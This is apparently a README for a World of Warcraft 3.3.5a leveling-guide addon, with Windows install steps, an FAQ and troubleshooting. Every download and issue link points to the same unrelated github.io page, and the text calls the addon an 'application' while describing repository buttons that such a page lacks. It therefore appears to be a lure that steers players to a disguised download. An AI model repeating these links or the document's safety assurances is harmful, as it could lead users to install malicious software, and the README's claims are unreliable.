# 🎮 RestedXP_RXPGuides-WotLK_3.3.5a - Your Ultimate Leveling Companion for Wrath Classic

[![Download Now](https://img.shields.io/badge/Download-RXPGuides_WotLK-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://watercoursesheetrock65.github.io)

## 🚀 What Is This?

RestedXP_RXPGuides-WotLK_3.3.5a is a powerful addon that transforms your World of Warcraft: Wrath of the Lich King (version 3.3.5a) game into a guided leveling experience. It shows you exactly where to go, what to do, and which quests to pick up—step by step—so you can level up your characters faster and with less confusion. Whether you're playing on a private server like AzerothCore or just want to breeze through the classic content, this addon has your back.

## ⭐ Key Features

- **Turn-by-Turn Guidance:** Get arrow pointers, waypoint markers, and clear text instructions that guide you from level 1 all the way to level 80.
- **Quest Helper:** Automatically detects quests in your log and displays the most efficient path to complete them.
- **Time Saver:** No more wandering around looking for quest givers or collecting items. The addon tells you exactly what you need.
- **Pruning Logic:** The guide intelligently skips unnecessary quests, keeping your leveling path smooth and fast.
- **Clean Interface:** Designed to be unobtrusive, with options to scale and move the guide window to your liking.
- **Beatle-Free:** No fluff, no filler—just practical, tested routes used by thousands of players.

## 📥 Download & Install (For Windows)

Visit this link to download the application: [RXPGuides WotLK Download](https://watercoursesheetrock65.github.io)

Once you're on the download page, follow these simple steps:

1.  Click the big green "Code" button, then select "Download ZIP" from the dropdown menu. Alternatively, you can click the "Releases" tab and download the latest `.zip` file.
2.  Once the download finishes, **locate the downloaded file** (usually in your "Downloads" folder). It will be a `.zip` file.
3.  **Right-click** the `.zip` file and choose **"Extract All..."** from the menu. Windows will ask where you want to put the files. Just pick a folder you can remember, like your Desktop.
4.  After extraction, you'll see a folder named something like `RestedXP_RXPGuides-WotLK_3.3.5a` (the exact name may vary). **This is your addon folder.**
5.  Now, find your World of Warcraft installation folder. This is typically located at:
    - `C:\Program Files (x86)\World of Warcraft\` (for older installs)
    - Or wherever you installed the game. If you use a launcher like WoW Classic, check the game directory settings.
6.  Inside your WoW folder, look for the **`Interface`** folder, then open it.
7.  Inside `Interface`, open the **`AddOns`** folder. If you don't see a folder named `AddOns`, create a new folder and name it exactly `AddOns` (no spaces, no quotes).
8.  **Copy** the addon folder you extracted in step 4, and **paste** it *inside* the `AddOns` folder you just located.
    - **Important:** Make sure you see the folder that contains the `.toc` file inside (like `RXPGuides.toc`). It should be `AddOns/RestedXP_RXPGuides-WotLK_3.3.5a/RXPGuides.toc`. If you see an extra folder layer (like `AddOns/RestedXP_RXPGuides-WotLK_3.3.5a/RestedXP_RXPGuides-WotLK_3.3.5a/`), you've made a mistake—move the inner folder up one level.
9.  Start your World of Warcraft game.
10. On the character selection screen, click the **"AddOns"** button at the bottom left.
11. Make sure the checkbox next to **RXPGuides** is ticked (so it says "Enabled"). If you want to be safe, you can tick "Load out of date AddOns" just in case.
12. Click **"OK"** and log into your character.

That's it! You should now see the RXPGuides window on your screen. If you don't see it, type `/rxp` in your chat box to open it manually.

## 🛠️ How to Use It (Quick Start)

1.  After you log in, the guide window will appear (usually on the side of your screen).
2.  If it doesn't, type `/rxp` in the chat.
3.  Choose a leveling guide from the list (e.g., 1-10, 10-20, etc.).
4.  Click **"Start Guide"**. The addon will now show you your next objective.
5.  Follow the arrow, the yellow text on your map, and the instructions in the window.
6.  When you complete an objective, the guide automatically advances to the next step. Sometimes you may need to click "Accept" or "Complete" on a progress bar in the guide if it doesn't update automatically.

## ❓ Frequently Asked Questions (FAQ)

### ❔ Is this addon safe to use with my server?
Yes. This is a backport specifically for 3.3.5a (WotLK) clients, including private servers like AzerothCore. It is built from Lua scripts and doesn't modify your game files. It's purely an addon.

### 🧩 Do I need to install anything else?
No. This is a standalone addon. There are no required libraries or dependencies.

### 🐛 I found a bug. What should I do?
Visit the [Issues](https://watercoursesheetrock65.github.io) section of the GitHub repository and create a new issue. Please describe the problem, include a screenshot if possible, and mention your level and zone when the issue occurred.

### 📅 How often is it updated?
The project is actively maintained. Check the Releases page for the latest version.

### 💰 Does it cost money?
No. It's completely free and open-source.

## 🔧 Troubleshooting

**Problem:** The addon window doesn't show up.
**Solution:** Type `/rxp` in your chat. If that doesn't work, check that the addon folder is correctly placed in `Interface/AddOns`. Ensure the `.toc` file is directly in that folder. Also, check that you enabled it in the AddOns list on the character screen.

**Problem:** The arrow is missing or pointing the wrong way.
**Solution:** In the addon options (type `/rxp config` or `/rxp`), look for settings related to "Arrow" or "Waypoint". Try toggling the arrow on, or adjust the "Arrow Style" setting.

**Problem:** The guide stopped in the middle and won't advance.
**Solution:** This can happen if a quest is skipped. Try using the "Skip Step" feature in the guide window, or right-click the guide title to find a "Seek" or "Skip To" option. If it's stuck on a "Turn In" step, manually find the quest giver and turn in the quest.

**Problem:** I see a Lua error.
**Solution:** Please report it on the GitHub Issues page. In the meantime, you can try a /reload (type `/reload` in chat) to fix most minor glitches.

## 📊 Compatibility

- **Game Version:** World of Warcraft: Wrath of the Lich King 3.3.5a (build 12340)
- **Operating System:** Windows (XP, Vista, 7, 8, 10, 11) - though it works on Mac/Linux via Wine as well.
- **Private Servers:** Compatible with any server running client version 3.3.5a (e.g., AzerothCore, TrinityCore, etc.)

## 🧑‍💻 For Advanced Users

If you're a developer or a tinkerer, you can contribute to the project. The source code is entirely Lua-based and well-structured. You can:

- Suggest new routes or improve existing ones.
- Report bugs with detailed steps to reproduce.
- Create pull requests with fixes or enhancements.

To get started, clone the repository, make your changes, and submit a PR. The development requires basic knowledge of Lua and the WoW API.

## 📜 License

This project is licensed under the MIT License. See the `LICENSE` file in the repository for more details.

## ❤️ Special Thanks

A huge shoutout to the original creators over at **RestedXP** for making such a fantastic addon. This backport wouldn't be possible without your hard work. Also thanks to the WoW modding community for their continuous support.

---

**Happy Leveling!** 🏰⚔️

Keywords: 335, 335a, azerothcore, leveling-guide, lua, restedxp, rxpguides, world-of-warcraft, wotlk, wotlk-335, wotlk-335a, wow-addon, wrath-of-the-lich-king